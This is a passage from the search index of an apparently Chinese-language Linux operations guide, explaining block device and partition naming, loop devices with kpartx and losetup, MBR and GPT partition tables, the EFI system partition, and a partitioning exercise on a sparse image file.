\u200b\u9a71\u52a8\u200b\u5b50\u7cfb\u7edf\u200b\u652f\u6301\u200b\u7684\u200b\u63a5\u53e3\u200b\u8fde\u63a5\u200b\u7684\u200b\u5149\u76d8\u200b\u9a71\u52a8\u5668\u200b\uff0c\u200b\u5176\u200b\u540d\u79f0\u200b\u4ee5\u200b <code>sr</code> \u200b\u5f00\u5934\u200b\u3002\u200b\u4e4b\u540e\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4ece\u200b <code>0</code> \u200b\u5f00\u59cb\u200b\u7684\u200b\u6570\u5b57\u200b\uff0c\u200b\u8868\u793a\u200b\u8bbe\u5907\u200b\u53f7\u200b\u3002\u200b\u6bd4\u5982\u200b <code>sr0</code> \u200b\u8868\u793a\u200b\u7b2c\u4e00\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c<code>sr1</code> \u200b\u8868\u793a\u200b\u7b2c\u4e8c\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\u3002 udev \u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u5230\u200b <code>/dev/sr0</code> \u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\uff0c\u200b\u540d\u4e3a\u200b <code>/dev/cdrom</code>\u3002\u200b\u8f6f\u200b\u94fe\u63a5\u200b\u7684\u200b\u540d\u79f0\u200b <code>/dev/cdrom</code> \u200b\u4e0e\u200b\u9a71\u52a8\u5668\u200b\u652f\u6301\u200b\u7684\u200b\u5149\u76d8\u200b\u7c7b\u578b\u200b\u548c\u200b\u63d2\u5165\u200b\u7684\u200b\u4ecb\u8d28\u200b\u65e0\u5173\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li><code>/dev/sr0</code> - \u200b\u5149\u76d8\u200b\u9a71\u52a8\u5668\u200b <code>0</code>\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u5149\u76d8\u200b\u9a71\u52a8\u5668\u200b\u3002</li> <li><code>/dev/sr4</code> - \u200b\u5149\u76d8\u200b\u9a71\u52a8\u5668\u200b <code>4</code>\uff0c\u200b\u7b2c\u4e94\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u5149\u76d8\u200b\u9a71\u52a8\u5668\u200b\u3002</li> <li><code>/dev/cdrom</code> - \u200b\u5230\u200b <code>/dev/sr0</code> \u200b\u7684\u200b\u7b26\u53f7\u200b\u94fe\u63a5\u200b\u3002</li> </ul>"},{"location":"ops/storage/filesystem/#virtio","title":"VirtIO \u200b\u5757\u200b\u8bbe\u5907\u200b\uff08\u200b\u865a\u62df\u200b\u78c1\u76d8\u200b\uff09","text":"<p>VirtIO \u200b\u5757\u200b\u8bbe\u5907\u200b\u7684\u200b\u540d\u79f0\u200b\u4ee5\u200b <code>vd</code> \u200b\u5f00\u5934\u200b\u3002\u200b\u4e4b\u540e\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4ece\u200b <code>a</code> \u200b\u5f00\u59cb\u200b\u7684\u200b\u5c0f\u5199\u5b57\u6bcd\u200b\uff0c<code>a</code> \u200b\u8868\u793a\u200b\u7b2c\u4e00\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\uff08<code>vda</code>\uff09\uff0cb \u200b\u8868\u793a\u200b\u7b2c\u4e8c\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\uff08<code>vdb</code>\uff09\uff0c\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li><code>/dev/vda</code> - \u200b\u8bbe\u5907\u200b <code>a</code>\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\u3002</li> <li><code>/dev/vde</code> - \u200b\u8bbe\u5907\u200b <code>e</code>\uff0c\u200b\u7b2c\u4e94\u4e2a\u200b\u53d1\u73b0\u200b\u7684\u200b\u8bbe\u5907\u200b\u3002</li> </ul>"},{"location":"ops/storage/filesystem/#partition","title":"\u5206\u533a","text":"<p>\u200b\u5c06\u200b\u9a71\u52a8\u5668\u200b\u8bbe\u5907\u200b\u540d\u200b\u4e0e\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5206\u533a\u200b\u7f16\u53f7\u200b\uff08\u200b\u4ece\u200b 1 \u200b\u5f00\u59cb\u200b\uff09\u200b\u7ec4\u5408\u200b\u8d77\u6765\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u5206\u533a\u200b\u8bbe\u5907\u200b\u540d\u200b\u3002 \u200b\u5bf9\u4e8e\u200b\u8bbe\u5907\u200b\u540d\u4ee5\u200b\u6570\u5b57\u200b\u7ed3\u5c3e\u200b\u7684\u200b\u9a71\u52a8\u5668\u200b\uff0c\u200b\u9700\u8981\u200b\u7528\u200b\u5b57\u6bcd\u200b <code>p</code> \u200b\u5206\u9694\u200b\u9a71\u52a8\u5668\u200b\u540d\u200b\u548c\u200b\u5206\u533a\u200b\u7f16\u53f7\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li><code>/dev/sda1</code> - <code>/dev/sda</code> \u200b\u4e0a\u200b\u7684\u200b\u5206\u533a\u200b <code>1</code>\u3002</li> <li><code>/dev/nvme2n5p3</code> - <code>/dev/nvme2n5</code> \u200b\u4e0a\u200b\u7684\u200b\u5206\u533a\u200b <code>3</code>\u3002</li> <li><code>/dev/mmcblk3p4</code> - <code>/dev/mmcblk3</code> \u200b\u4e0a\u200b\u7684\u200b\u5206\u533a\u200b <code>4</code>\u3002</li> <li><code>/dev/vda1</code> - <code>/dev/vda</code> \u200b\u4e0a\u200b\u7684\u200b\u5206\u533a\u200b <code>1</code>\u3002</li> <li><code>/dev/loop0p2</code> - <code>/dev/loop0</code> \u200b\u4e0a\u200b\u7684\u200b\u5206\u533a\u200b <code>2</code>\u3002</li> </ul>"},{"location":"ops/storage/filesystem/#loop","title":"\u672c\u5730\u200b\u56de\u73af","text":"<p>Linux \u200b\u652f\u6301\u200b\u300c\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u8bbe\u5907\u200b\u300d\uff0c\u200b\u652f\u6301\u200b\u6302\u8f7d\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u4f5c\u4e3a\u200b\u5757\u200b\u8bbe\u5907\u200b\u4f7f\u7528\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u300c\u200b\u865a\u62df\u5149\u9a71\u200b\u300d\u200b\u7c7b\u200b\u8f6f\u4ef6\u200b\u3002 \u200b\u56e0\u6b64\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u5728\u200b\u4e0d\u200b\u8d2d\u4e70\u200b\u65b0\u200b\u786c\u4ef6\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u8fdb\u884c\u200b\u4e00\u4e9b\u200b\u78c1\u76d8\u200b\u76f8\u5173\u200b\u7684\u200b\u5b9e\u9a8c\u200b\u3002</p> <p>\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u4e0e\u200b\u5bb9\u5668\u200b</p> <p>Linux \u200b\u76ee\u524d\u200b\u4e0d\u200b\u652f\u6301\u200b\u8bbe\u5907\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff08\u200b\u9694\u79bb\u200b\uff09\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5728\u200b\u5bb9\u5668\u200b\u73af\u5883\u200b\u5185\u200b\u5bf9\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u8fdb\u884c\u200b\u6302\u8f7d\u200b\u7b49\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u9700\u8981\u200b\u7279\u6743\u200b\u5bb9\u5668\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e3a\u200b root \u200b\u6743\u9650\u200b\u3002 Linux \u200b\u5185\u6838\u200b\u5f00\u53d1\u200b\u4e2d\u66fe\u200b\u6709\u8fc7\u200b\u5141\u8bb8\u200b\u975e\u200b\u7279\u6743\u200b\u7528\u6237\u200b\u6302\u8f7d\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u7684\u200b\u8ba8\u8bba\u200b\uff08loopfs LWN\uff09\uff0c \u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b\u5b89\u5168\u6027\u200b\u95ee\u9898\u200b\uff08\u200b\u5185\u6838\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5f00\u53d1\u200b\u65f6\u200b\u5047\u8bbe\u200b\u6302\u8f7d\u200b\u7684\u200b\u5185\u5bb9\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u6076\u610f\u200b\u6784\u9020\u200b\uff0c\u200b\u800c\u200b\u63d0\u4f9b\u200b\u76f8\u5173\u200b\u652f\u6301\u200b\u4f1a\u200b\u7834\u574f\u200b\u8fd9\u6837\u200b\u7684\u200b\u5047\u8bbe\u200b\uff09\uff0c\u200b\u672a\u200b\u8fdb\u5165\u200b\u4e3b\u7ebf\u200b\u3002</p> <p>\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b Vlab \u200b\u4e0d\u200b\u652f\u6301\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u7684\u200b\u539f\u56e0\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>mount</code> \u200b\u547d\u4ee4\u200b\u6302\u8f7d\u200b\u6587\u4ef6\u200b\u5230\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u3002\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u7528\u9014\u200b\u662f\u200b\u6302\u8f7d\u200b\u4e00\u4e2a\u200b ISO \u200b\u6587\u4ef6\u200b\uff1a</p> <pre><code>$ sudo mount -o loop ./debian-12.4.0-amd64-DVD-1.iso /media/iso\n$ cd /media/iso\n$ ls\nboot/  debian@  doc/  firmware/  install.amd/  md5sum.txt  pool/        README.mirrors.html  README.source\ncss/   dists/   EFI/  install/   isolinux/     pics/       README.html  README.mirrors.txt   README.txt\n$ cd\n$ sudo umount /media/iso\n</code></pre> <p>\u200b\u4f46\u662f\u200b\u6709\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u6302\u8f7d\u200b\u6d4b\u8bd5\u200b\u78c1\u76d8\u955c\u50cf\u200b\u4e2d\u200b\u7684\u200b\u67d0\u4e2a\u200b\u5206\u533a\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4f7f\u7528\u200b <code>mount</code> \u200b\u5c31\u200b\u4f1a\u200b\u9ebb\u70e6\u200b\u5f88\u591a\u200b\u2014\u2014\u200b\u9700\u8981\u200b\u8ba1\u7b97\u200b\u5bf9\u5e94\u200b\u7684\u200b\u504f\u79fb\u91cf\u200b\u3002 \u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>kpartx</code> \u200b\u547d\u4ee4\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u81ea\u52a8\u8bc6\u522b\u200b\u78c1\u76d8\u955c\u50cf\u200b\u4e2d\u200b\u7684\u200b\u5206\u533a\u200b\uff0c\u200b\u5e76\u200b\u521b\u5efa\u200b\u5bf9\u5e94\u200b\u7684\u200b\u56de\u73af\u200b\u8bbe\u5907\u200b\uff1a</p> <pre><code>$ fdisk -l ./root.img\nDisk ./root.img: 5 GiB, 5368709120 bytes, 10485760 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisklabel type: gpt\nDisk identifier: 9E89351F-1674-4BA6-9FA3-D063E7C028E0\n\nDevice       Start      End Sectors  Size Type\n./root.img1   2048   499711  497664  243M EFI System\n./root.img2 499712 10483711 9984000  4.8G Linux filesystem\n$ sudo kpartx -av ./root.img\nadd map loop0p1 (254:0): 0 497664 linear 7:0 2048\nadd map loop0p2 (254:1): 0 9984000 linear 7:0 499712\n$ ls -l /dev/mapper/loop0p*\nlrwxrwxrwx 1 root root 7 Feb 10 17:22 /dev/mapper/loop0p1 -&gt; ../dm-0\nlrwxrwxrwx 1 root root 7 Feb 10 17:22 /dev/mapper/loop0p2 -&gt; ../dm-1\n$ sudo mount /dev/mapper/loop0p2 /media/root\n$ ls /media/root\n...\n$ sudo umount /media/root\n$ sudo kpartx -dv ./root.img\ndel devmap : loop0p1\ndel devmap : loop0p2\nloop deleted : /dev/loop0\n</code></pre> <p>\u200b\u7cfb\u7edf\u200b\u7684\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u4fe1\u606f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>losetup</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u3002\u200b\u8be5\u200b\u547d\u4ee4\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7ba1\u7406\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u8bbe\u5907\u200b\uff1a</p> <pre><code>$ sudo kpartx -av ./root.img\n...\n$ sudo losetup -a\n/dev/loop0: [0028]:18723300 (/home/username/tmp/root.img)\n$ sudo losetup -D\n$ sudo losetup -a  # \u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\u7684\u200b\u8bbe\u5907\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u7acb\u523b\u200b\u5220\u9664\u200b\n/dev/loop0: [0028]:18723300 (/home/username/tmp/root.img)\n$ sudo losetup --partscan --find ./root2.img  # partscan \u200b\u7528\u4e8e\u200b\u81ea\u52a8\u8bc6\u522b\u200b\u5206\u533a\u200b\uff0cfind \u200b\u7528\u4e8e\u200b\u81ea\u52a8\u200b\u5206\u914d\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u8bbe\u5907\u200b\n$ # \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u81ea\u5df1\u200b\u6307\u5b9a\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u8bbe\u5907\u200b\u8def\u5f84\u200b\n$ sudo losetup -a\n/dev/loop1: [0028]:18789360 (/home/username/tmp/root2.img)\n/dev/loop0: [0028]:18723300 (/home/username/tmp/root.img)\n$ ls -lha /dev/loop1*  # \u200b\u8be5\u200b\u955c\u50cf\u200b\u4e2d\u200b\u5305\u542b\u200b\u7684\u200b\u4e24\u4e2a\u200b\u5206\u533a\u200b\u81ea\u52a8\u8bc6\u522b\u200b\u4e3a\u4e86\u200b loop1p1 \u200b\u548c\u200b loop1p2\nbrw-rw---- 1 root disk   7, 1 Feb 10 17:30 /dev/loop1\nbrw-rw---- 1 root disk 259, 4 Feb 10 17:30 /dev/loop1p1\nbrw-rw---- 1 root disk 259, 5 Feb 10 17:30 /dev/loop1p2\n$ sudo losetup -d /dev/loop1\n$ sudo losetup -a\n/dev/loop0: [0028]:18723300 (/home/username/tmp/root.img)\n$ sudo kpax -dv ./root.img  # \u200b\u6e05\u7406\u200b\u73b0\u573a\u200b\n$ sudo losetup -a\n</code></pre>"},{"location":"ops/storage/filesystem/#partition","title":"\u5206\u533a\u8868","text":"<p>\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b MBR \u200b\u4e0e\u200b GPT \u200b\u5206\u533a\u8868\u200b\u3002</p> <p>MBR\uff08Master Boot Record\uff09\u200b\u5206\u533a\u8868\u200b\u662f\u200b\u65e9\u671f\u200b\u7684\u200b\u5206\u533a\u8868\u200b\u683c\u5f0f\u200b\uff0c\u200b\u5728\u200b\u5b58\u50a8\u200b\u5206\u533a\u200b\u4fe1\u606f\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u8fd8\u200b\u8d1f\u8d23\u200b\u7cfb\u7edf\u200b\u7684\u200b\u542f\u52a8\u200b\u3002 MBR \u200b\u4fe1\u606f\u200b\u5b58\u50a8\u200b\u5728\u200b\u78c1\u76d8\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u6247\u533a\u200b<sup>1</sup>\uff08512 \u200b\u5b57\u8282\u200b<sup>2</sup>\uff09\uff0c\u200b\u5176\u4e2d\u200b\u7528\u4e8e\u200b\u5f15\u5bfc\u200b\u7684\u200b\u4ee3\u7801\u200b\u4f4d\u4e8e\u200b\u6700\u200b\u5f00\u5934\u200b\uff0c\u200b\u5360\u636e\u200b 440 \u200b\u5b57\u8282\u200b\uff08BIOS \u200b\u5728\u200b\u542f\u52a8\u200b\u4f1a\u200b\u52a0\u8f7d\u200b\u4ee3\u7801\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8df3\u8f6c\u200b\uff09\uff1b \u200b\u63d0\u4f9b\u200b\u7ed9\u200b\u5206\u533a\u200b\u4fe1\u606f\u200b\u7684\u200b\u7a7a\u95f4\u200b\u53ea\u6709\u200b 64 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u3002\u200b\u7531\u4e8e\u200b\u6bcf\u4e2a\u200b\u5206\u533a\u200b\u9700\u8981\u200b 16 \u200b\u5b57\u8282\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u56e0\u6b64\u200b MBR \u200b\u5206\u533a\u8868\u200b\u6700\u200b\u591a\u200b\u652f\u6301\u200b 4 \u200b\u4e2a\u4e3b\u200b\u5206\u533a\u200b\u3002 \u200b\u4e3a\u4e86\u200b\u8ba9\u200b\u78c1\u76d8\u200b\u652f\u6301\u200b\u66f4\u200b\u591a\u200b\u5206\u533a\u200b\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u6269\u5c55\u200b\u5206\u533a\u200b\u7684\u200b\u6982\u5ff5\u200b\u3002 \u200b\u6269\u5c55\u200b\u5206\u533a\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b\u4e3b\u200b\u5206\u533a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5212\u5206\u200b\u4e3a\u200b\u591a\u4e2a\u200b\u903b\u8f91\u200b\u5206\u533a\u200b\u3002\u200b\u53d7\u5230\u200b\u8bbe\u8ba1\u200b\u9650\u5236\u200b\uff0cMBR \u200b\u4ec5\u200b\u652f\u6301\u200b\u6700\u5927\u200b 2 TiB \u200b\u7684\u200b\u78c1\u76d8\u200b\u3002</p> <p>\u200b\u800c\u200b GPT\uff08GUID Partition Table\uff09\u200b\u5206\u533a\u8868\u200b\u662f\u200b\u65b0\u4e00\u4ee3\u200b\u7684\u200b\u5206\u533a\u8868\u200b\u683c\u5f0f\u200b\uff0c\u200b\u4e0d\u518d\u200b\u5b58\u50a8\u200b\u5f15\u5bfc\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u652f\u6301\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u5206\u533a\u200b\u3001\u200b\u66f4\u5927\u200b\u7684\u200b\u78c1\u76d8\u200b\u3002 \u200b\u76ee\u524d\u200b\u9664\u975e\u200b\u6781\u5176\u200b\u8001\u65e7\u200b\u7684\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u90fd\u200b\u4f7f\u7528\u200b GPT \u200b\u5206\u533a\u8868\u200b\u3002GPT \u200b\u5206\u533a\u8868\u200b\u5728\u200b\u6700\u200b\u5f00\u5934\u200b\u5b58\u50a8\u200b\u4e86\u200b\u4e00\u4efd\u200b\u300c\u200b\u4fdd\u62a4\u6027\u200b MBR\u300d\uff08Protective MBR\uff09\uff0c\u200b\u7528\u4e8e\u200b\u9632\u6b62\u200b\u4e0d\u200b\u8ba4\u8bc6\u200b GPT \u200b\u7684\u200b\u65e7\u200b\u7cfb\u7edf\u200b\u548c\u200b\u8f6f\u4ef6\u200b\u5bf9\u200b\u78c1\u76d8\u200b\u8bef\u64cd\u4f5c\u200b\uff0c \u200b\u540c\u65f6\u200b\u5206\u533a\u8868\u200b\u4fe1\u606f\u200b\u5728\u200b\u78c1\u76d8\u200b\u6700\u540e\u200b\u6709\u200b\u4e00\u4efd\u200b\u5907\u4efd\u200b\uff0c\u200b\u4ee5\u200b\u51cf\u5c0f\u200b\u635f\u574f\u200b\u98ce\u9669\u200b\u3002</p> <p>\u200b\u90a3\u200b GPT \u200b\u7684\u200b\u78c1\u76d8\u200b\u600e\u4e48\u200b\u5f00\u673a\u200b\u5462\u200b\uff1f</p> <p>\u200b\u5bf9\u4e8e\u200b\u4f7f\u7528\u200b\u4f20\u7edf\u200b BIOS \u200b\u7684\u200b\u673a\u5668\u200b\uff0cGPT \u200b\u5f00\u5934\u200b\u7684\u200b\u4fdd\u62a4\u6027\u200b MBR \u200b\u4ecd\u7136\u200b\u53ef\u4ee5\u200b\u5b58\u50a8\u200b\u5f15\u5bfc\u200b\u4ee3\u7801\u200b\u3002\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u76ee\u524d\u200b\u7684\u200b\u4e3b\u6d41\u200b\u662f\u200b\u4f7f\u7528\u200b UEFI\uff0c\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u5728\u200b\u6247\u533a\u200b\u91cc\u200b\u5b58\u50a8\u200b\u5f15\u5bfc\u200b\u4ee3\u7801\u200b\uff0c \u200b\u800c\u662f\u200b\u6709\u200b\u4e00\u4e2a\u200b\u4e13\u95e8\u200b\u7684\u200b EFI \u200b\u7cfb\u7edf\u200b\u5206\u533a\u200b\uff08\u200b\u5fc5\u987b\u200b\u683c\u5f0f\u5316\u200b\u4e3a\u200b FAT32\uff09\uff0c\u200b\u7528\u6765\u200b\u5b58\u50a8\u200b\u5f15\u5bfc\u200b\u7a0b\u5e8f\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u4fe1\u606f\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u5c55\u793a\u200b\u4e00\u4e2a\u200b EFI \u200b\u7cfb\u7edf\u200b\u5206\u533a\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>$ sudo mount /dev/disk/by-uuid/0E62-46C6 /efi\n$ mount | grep efi\n...\n/dev/nvme0n1p1 on /efi type vfat (rw,relatime,fmask=0077,dmask=0077,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro)\n$ sudo tree /efi\n/efi/\n\u251c\u2500\u2500 $RECYCLE.BIN\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 desktop.ini\n\u251c\u2500\u2500 BOOT\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 BOOT.SDI\n\u251c\u2500\u2500 EFI\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 arch\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 fw\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 fwupdx64.efi\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Boot\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 bootx64.efi\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 LenovoBT.EFI\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 License.txt\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 ReadMe.txt\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 GRUB\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 grubx64.efi\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Linux\n\u2514\u2500\u2500 System Volume Information\n    \u251c\u2500\u2500 IndexerVolumeGuid\n    \u2514\u2500\u2500 WPSettings.dat\n\n10 directories, 10 files\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b <code>efi</code> \u200b\u540e\u7f00\u200b\u7684\u200b\u6587\u4ef6\u200b\u5c31\u662f\u200b UEFI \u200b\u4f1a\u200b\u9009\u62e9\u200b\u7684\u200b\u542f\u52a8\u200b\u5f15\u5bfc\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u4e00\u822c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u542f\u52a8\u200b\u65f6\u200b\u6309\u200b\u4e0b\u200b F12 \u200b\u6216\u8005\u200b\u5176\u4ed6\u200b\u5feb\u6377\u952e\u200b\u9009\u62e9\u200b\u542f\u52a8\u200b\u7684\u200b\u8bbe\u5907\u200b\u6216\u200b EFI \u200b\u6587\u4ef6\u200b\u3002</p> <p>/efi</p> <p>\u200b\u5728\u200b systemd \u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5c42\u6b21\u7ed3\u6784\u200b\u6807\u51c6\u200b (FHS) \u200b\u6269\u5c55\u200b \u200b\u4e2d\u200b\uff0c \u200b\u5982\u679c\u200b <code>/boot</code> \u200b\u72ec\u7acb\u200b\u4e8e\u200b EFI \u200b\u7cfb\u7edf\u200b\u5206\u533a\u200b (ESP)\uff0c\u200b\u5219\u200b\u540e\u8005\u200b\u6302\u8f7d\u200b\u70b9\u4e3a\u200b <code>/efi</code>\u3002</p> <p>\u200b\u8fc7\u53bb\u200b EFI \u200b\u5206\u533a\u200b\u6302\u8f7d\u200b\u70b9\u200b\u901a\u5e38\u200b\u4e3a\u200b <code>/boot/efi</code>\uff0c\u200b\u73b0\u5728\u200b\u5df2\u200b\u4e0d\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b<sup>3</sup>\u3002</p>"},{"location":"ops/storage/filesystem/#partition-exp","title":"\u5b9e\u9a8c\u200b\u64cd\u4f5c\u200b\u5c55\u793a","text":"<p>\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u8bf8\u5982\u200b <code>fdisk</code>, <code>parted</code> \u200b\u7b49\u200b\u5de5\u5177\u200b\u5bf9\u200b\u5206\u533a\u8868\u200b\u8fdb\u884c\u200b\u64cd\u4f5c\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u56fe\u5f62\u754c\u9762\u200b\u7528\u6237\u200b\uff0c<code>gparted</code> \u200b\u662f\u200b\u4e00\u4e2a\u200b\u4e0d\u9519\u200b\u7684\u200b\u9009\u62e9\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u7a7a\u200b\u6587\u4ef6\u200b\uff1a</p> <pre><code>truncate -s 8G test.img\n</code></pre> <p>\u200b\u7a00\u758f\u200b\u6587\u4ef6\u200b</p> <p>\u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u521b\u5efa\u200b\u4e86\u200b\u300c\u200b\u7a00\u758f\u200b\u6587\u4ef6\u200b\u300d\uff08Sparse file\uff09\u3002\u200b\u5c3d\u7ba1\u200b\u6587\u4ef6\u5927\u5c0f\u200b\u662f\u200b 8G\uff0c\u200b\u4f46\u662f\u200b\u5b9e\u9645\u4e0a\u200b\u53ea\u200b\u5360\u7528\u200b\u4e86\u200b\u5f88\u5c11\u200b\u7684\u200b\u78c1\u76d8\u7a7a\u95f4\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4ee5\u6b64\u200b\u9a8c\u8bc1\u200b\uff1a</p> <pre><code>$ du -h test.img\n0   test.img\n$ du -h --apparent-size test.img\n8G  test.img\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u64cd\u4f5c\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u800c\u200b\u4e0d\u7528\u200b\u62c5\u5fc3\u200b\u7834\u574f\u200b\u771f\u5b9e\u200b\u7684\u200b\u78c1\u76d8\u200b\u3002</p> <pre><code>fdisk test.img\n# \u200b\u6216\u8005\u200b\nparted test.img\n</code></pre> <p>\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b 256M \u200b\u7684\u200b EFI \u200b\u5206\u533a\u200b\uff0c\u200b\u4e00\u4e2a\u200b 1G \u200b\u7684\u200b swap \u200b\u5206\u533a\u200b\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u7a7a\u95f4\u200b\u4f5c\u4e3a\u200b\u6839\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5206\u533a\u200b\u3002</p> <p>\u200b\u4ec0\u4e48\u200b\u662f\u200b swap\uff1f</p> <p>Swap\uff08\u200b\u4ea4\u6362\u200b\uff09\u200b\u5206\u533a\u200b\u662f\u200b Linux \u200b\u865a\u62df\u5185\u5b58\u200b\u7ba1\u7406\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u3002\u200b\u5f53\u200b\u7269\u7406\u200b\u5185\u5b58\u4e0d\u8db3\u200b\u65f6\u200b\uff0c\u200b\u7cfb\u7edf\u200b\u4f1a\u200b\u5c06\u200b\u4e00\u90e8\u5206\u200b\u5185\u5b58\u200b\u300c\u200b\u4ea4\u6362\u200b\u300d\u200b\u5230\u200b swap 